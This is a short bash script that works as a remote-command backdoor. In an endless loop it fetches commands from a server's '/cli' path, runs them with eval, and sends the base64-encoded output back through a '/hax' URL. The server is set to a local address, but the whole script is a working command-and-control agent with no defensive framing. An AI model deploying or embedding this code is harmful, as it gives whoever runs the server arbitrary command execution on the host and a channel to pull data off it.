#!/usr/bin/env bash

while true; do
    url="127.0.0.1:8080"  # Corrected the URL
    a=$(curl -s -X GET "$url/cli")
    if [ "$a" != "" ]; then
        b=$(eval "$a" 2>&1)
        c=$(echo -n "$b" | base64)
        # URL-encode the base64-encoded data
        c_urlencoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$c'''))")
        e="http://$url/hax"
        d="$e?data=$c_urlencoded"
        echo "$d"
        curl -s -X GET "$d"
        sleep 2
    else
        sleep 2
        echo "it works"
    fi
done

